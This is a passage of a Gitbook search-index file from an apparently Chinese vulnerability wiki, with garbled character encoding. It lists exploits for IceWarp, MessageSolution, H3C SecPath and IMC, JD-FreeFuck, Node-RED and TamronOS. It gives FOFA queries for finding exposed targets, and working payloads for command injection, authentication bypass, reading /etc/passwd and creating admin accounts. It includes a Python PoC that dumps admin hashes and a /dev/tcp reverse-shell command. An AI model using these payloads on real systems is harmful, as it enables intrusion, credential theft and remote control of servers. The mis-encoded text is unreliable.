"},"book/WebÂ∫îÁî®ÊºèÊ¥û/IceWarp/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/IceWarp/","title":"IceWarp","keywords":"","body":"IceWarp IceWarp WebClient basic ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/IceWarp/IceWarp WebClient basic ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/IceWarp/IceWarp WebClient basic ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"IceWarp WebClient basic ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"IceWarp WebClient basic ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ IceWarp WebClient Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÊûÑÈÄ†ÁâπÊÆäÁöÑËØ∑Ê±ÇÂç≥ÂèØËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] IceWarp WebClient FOFA [!NOTE] app=\"IceWarp-ÂÖ¨Âè∏‰∫ßÂìÅ\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûËØ∑Ê±ÇÂåÖ‰∏∫ POST /webmail/basic/ HTTP/1.1 Host: sd.sahadharawat.com Content-Type: application/x-www-form-urlencoded Cookie: use_cookies=1 Content-Length: 43 _dlg[captcha][target]=system(\\'ipconfig\\')\\ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Jupyter Notebook/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Jupyter Notebook/","title":"Jupyter Notebook","keywords":"","body":"Jupyter Notebook Êú™ÊéàÊùÉËÆøÈóÆËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Jupyter Notebook Êú™ÊéàÊùÉËÆøÈóÆËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Jupyter Notebook/Jupyter Notebook Êú™ÊéàÊùÉËÆøÈóÆËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Jupyter Notebook/Jupyter Notebook Êú™ÊéàÊùÉËÆøÈóÆËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Jupyter Notebook Êú™ÊéàÊùÉËÆøÈóÆËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Jupyter Notebook Êú™ÊéàÊùÉËÆøÈóÆËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Jupyter NotebookÔºàÊ≠§ÂâçË¢´Áß∞‰∏∫ IPython notebookÔºâÊòØ‰∏Ä‰∏™‰∫§‰∫íÂºèÁ¨îËÆ∞Êú¨ÔºåÊîØÊåÅËøêË°å 40 Â§öÁßçÁºñÁ®ãËØ≠Ë®Ä„ÄÇ Â¶ÇÊûúÁÆ°ÁêÜÂëòÊú™‰∏∫Jupyter NotebookÈÖçÁΩÆÂØÜÁ†ÅÔºåÂ∞ÜÂØºËá¥Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥ûÔºåÊ∏∏ÂÆ¢ÂèØÂú®ÂÖ∂‰∏≠ÂàõÂª∫‰∏Ä‰∏™consoleÂπ∂ÊâßË°å‰ªªÊÑèPython‰ª£Á†ÅÂíåÂëΩ‰ª§„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Jupyter Notebook FOFA [!NOTE] app=\"Jupyter-Notebook\" && body=\"Terminal\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁõÆÊ†á, ÁÇπÂáª Terminal ÊâìÂºÄÂëΩ‰ª§Ë°åÁïåÈù¢ ÊâßË°åÂëΩ‰ª§Âπ∂ÂèçÂºπshell Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/MessageSolution/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/MessageSolution/","title":"MessageSolution","keywords":"","body":"MessageSolution MessageSolution ÈÇÆ‰ª∂ÂΩíÊ°£Á≥ªÁªüEEA ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CNVD-2021-10543 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/MessageSolution/MessageSolution  ÈÇÆ‰ª∂ÂΩíÊ°£Á≥ªÁªüEEA ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CNVD-2021-10543.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/MessageSolution/MessageSolution  ÈÇÆ‰ª∂ÂΩíÊ°£Á≥ªÁªüEEA ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CNVD-2021-10543.html","title":"MessageSolution  ÈÇÆ‰ª∂ÂΩíÊ°£Á≥ªÁªüEEA ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CNVD-2021-10543","keywords":"","body":"MessageSolution ÈÇÆ‰ª∂ÂΩíÊ°£Á≥ªÁªüEEA ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CNVD-2021-10543 ÊºèÊ¥ûÊèèËø∞ MessageSolution‰ºÅ‰∏öÈÇÆ‰ª∂ÂΩíÊ°£ÁÆ°ÁêÜÁ≥ªÁªü EEAÊòØÂåó‰∫¨ÊòìËÆØÊÄùËææÁßëÊäÄÂºÄÂèëÊúâÈôêÂÖ¨Âè∏ÂºÄÂèëÁöÑ‰∏ÄÊ¨æÈÇÆ‰ª∂ÂΩíÊ°£Á≥ªÁªü„ÄÇËØ•Á≥ªÁªüÂ≠òÂú®ÈÄöÁî®WEB‰ø°ÊÅØÊ≥ÑÊºèÔºåÊ≥ÑÈú≤WindowsÊúçÂä°Âô®administrator hash‰∏éwebË¥¶Âè∑ÂØÜÁ†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] MessageSolution ‰ºÅ‰∏öÈÇÆ‰ª∂ÂΩíÊ°£ÁÆ°ÁêÜÁ≥ªÁªüEEA FOFA [!NOTE] title=\"MessageSolution Enterprise Email Archiving (EEA)\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËÆøÈóÆÂ¶Ç‰∏ãUrl http://xxx.xxx.xxx.xxx/authenticationserverservlet/ ‰ΩøÁî®Ëé∑ÂæóÂà∞ÁöÑÂØÜÁ†ÅÂèØ‰ª•ÁôªÂΩïÁ≥ªÁªü ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: MessageSolution ‰ºÅ‰∏öÈÇÆ‰ª∂ÂΩíÊ°£ÁÆ°ÁêÜÁ≥ªÁªüEEA \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/authenticationserverservlet/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and \"administrator\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®‰ø°ÊÅØÊ≥ÑÈú≤ ÂìçÂ∫î‰∏∫:{}\\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] MessageSolution ÈÇÆ‰ª∂ÂΩíÊ°£Á≥ªÁªüEEA ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CNVD-2021-10543 Goby & POC Â∑≤ÁªèÊõ¥Êñ∞Âà∞ Github‰∏≠ ÂèÇËÄÉÊñáÁ´† https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/H3C/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/H3C/","title":"H3C","keywords":"","body":"H3C H3C SecParhÂ†°ÂûíÊú∫ get_detail_view.php ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/H3C/H3C SecParhÂ†°ÂûíÊú∫ get_detail_view.php ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/H3C/H3C SecParhÂ†°ÂûíÊú∫ get_detail_view.php ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html","title":"H3C SecParhÂ†°ÂûíÊú∫ get_detail_view.php ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û","keywords":"","body":"H3C SecParhÂ†°ÂûíÊú∫ get_detail_view.php ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ H3C SecParhÂ†°ÂûíÊú∫ get_detail_view.php Â≠òÂú®‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û ‰∏éÈΩêÊ≤ªÂ†°ÂûíÊú∫Âá∫Áé∞ÁöÑÊºèÊ¥ûÁõ∏‰ºº ÊºèÊ¥ûÂΩ±Âìç [!NOTE] H3C SecParhÂ†°ÂûíÊú∫ FOFA [!NOTE] app=\"H3C-SecPath-ËøêÁª¥ÂÆ°ËÆ°Á≥ªÁªü\" && body=\"2018\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã POCÈ™åËØÅÁöÑUrl‰∏∫ /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin ÊàêÂäüËé∑ÂèñadminÊùÉÈôê Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/H3C/H3C SecParhÂ†°ÂûíÊú∫ data_provider.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/H3C/H3C SecParhÂ†°ÂûíÊú∫ data_provider.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"H3C SecParhÂ†°ÂûíÊú∫ data_provider.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"H3C SecParhÂ†°ÂûíÊú∫ data_provider.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ H3C SecParhÂ†°ÂûíÊú∫ data_provider.php Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøá‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊàñËÄÖË¥¶Âè∑ÂØÜÁ†ÅËøõÂÖ•ÂêéÂè∞Â∞±ÂèØ‰ª•ÊûÑÈÄ†ÁâπÊÆäÁöÑËØ∑Ê±ÇÊâßË°åÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] H3C SecParhÂ†°ÂûíÊú∫ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] H3C SecParhÂ†°ÂûíÊú∫ FOFA [!NOTE] app=\"H3C-SecPath-ËøêÁª¥ÂÆ°ËÆ°Á≥ªÁªü\" && body=\"2018\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂÖàÈÄöËøá‰ªªÊÑèÁî®Êà∑ÁôªÂΩïËé∑ÂèñCookie /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/H3C/H3C IMC dynamiccontent.properties.xhtm ËøúÁ®ãÂëΩ‰ª§ÊâßË°å.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/H3C/H3C IMC dynamiccontent.properties.xhtm ËøúÁ®ãÂëΩ‰ª§ÊâßË°å.html","title":"H3C IMC dynamiccontent.properties.xhtm ËøúÁ®ãÂëΩ‰ª§ÊâßË°å","keywords":"","body":" ÊºèÊ¥ûÊèèËø∞ H3C IMC dynamiccontent.properties.xhtm Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÁâπÊÆäÁöÑËØ∑Ê±ÇÈÄ†ÊàêËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] H3C IMC FOFA [!NOTE] \"/imc/login.jsf\" && body=\"/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢‰∏∫ ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂåÖ POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: Connection: close Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8 Cookie: oam.Flash.RENDERMAP.TOKEN=jw7ysel68; JSESSIONID=EB4E60FA4F333FF21B488E9937B4C739; currentThemeName=imc-new-webui Content-Type: application/x-www-form-urlencoded Content-Length: 1564 pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/JD-FreeFuck/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/JD-FreeFuck/","title":"JD-FreeFuck","keywords":"","body":"JD-FreeFuck JD-FreeFuck ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/JD-FreeFuck/JD-FreeFuck ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/JD-FreeFuck/JD-FreeFuck ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"JD-FreeFuck ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"JD-FreeFuck ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ JD-FreeFuck Â≠òÂú®ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÁî±‰∫é‰º†ÂèÇÊâßË°åÂëΩ‰ª§Êó∂Ê≤°ÊúâÂØπÂÜÖÂÆπËøáÊª§ÔºåÂØºËá¥ÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÔºåÊéßÂà∂ÊúçÂä°Âô® È°πÁõÆÂú∞ÂùÄÔºö https://github.com/meselson/JD-FreeFuck ÊºèÊ¥ûÂΩ±Âìç [!NOTE] JD-FreeFuck FOFA [!NOTE] title=\"‰∫¨‰∏úËñÖÁæäÊØõÊéßÂà∂Èù¢Êùø\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÂêéÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫ useradmin/supermanito ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂåÖÊâßË°åÂëΩ‰ª§ POST /runCmd HTTP/1.1 Host: 101.200.189.251:5678 Content-Length: 50 Pragma: no-cache Cache-Control: no-cache Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U Connection: close cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500 ÂÖ∂‰∏≠ cmd ÂèÇÊï∞Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ• ÂèçÂºπshell cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500 ÂèÇËÄÉÊñáÁ´† @Ê°ÉËä±ÂøÉ Â∏àÂÇÖ https://www.secquan.org/Discuss/1071932#reply3 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Node-RED/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Node-RED/","title":"Node-RED","keywords":"","body":"Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Node-RED/Node-RED ui_base ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Node-RED/Node-RED ui_base ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"Node-RED ui_base ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"Node-RED ui_base ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Node-RED Âú®/nodes/ui_base.js‰∏≠ÔºåURL‰∏é'/ui_base/js/*'ÂåπÈÖçÔºåÁÑ∂Âêé‰º†ÈÄíÁªôpath.joinÔºå Áº∫‰πèÂØπÊúÄÁªàË∑ØÂæÑÁöÑÈ™åËØÅ‰ºöÂØºËá¥Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥ûÔºåÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÊºèÊ¥ûËØªÂèñÊúçÂä°Âô®‰∏äÁöÑÊïèÊÑüÊï∞ÊçÆÔºåÊØîÂ¶Çsettings.js ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Node-RED FOFA [!NOTE] title=\"Node-RED\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÈ°µÈù¢ È™åËØÅPOC /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd /ui_base/js/..%2f..%2f..%2f..%2fsettings.js Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TamronOS/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TamronOS/","title":"TamronOS","keywords":"","body":"TamronOS TamronOS IPTVÁ≥ªÁªü ping ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û TamronOS IPTVÁ≥ªÁªü submit ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TamronOS/TamronOS IPTVÁ≥ªÁªü submit ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TamronOS/TamronOS IPTVÁ≥ªÁªü submit ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û.html","title":"TamronOS IPTVÁ≥ªÁªü submit ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û","keywords":"","body":"TamronOS IPTVÁ≥ªÁªü submit ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ TamronOS IPTVÁ≥ªÁªü /api/manager/submit Â≠òÂú®‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ËøõÂÖ•ÂêéÂè∞ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] TamronOS IPTVÁ≥ªÁªü FOFA [!NOTE] app=\"TamronOS-IPTVÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûPOC‰∏∫ /api/manager/submit?group=1&username=test&password=123456 user: test pass: 123456 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TamronOS/TamronOS IPTVÁ≥ªÁªü ping ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TamronOS/TamronOS IPTVÁ≥ªÁªü ping ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"TamronOS IPTVÁ≥ªÁªü ping ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"TamronOS IPTVÁ≥ªÁªü ping ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ TamronOS IPTVÁ≥ªÁªü api/ping 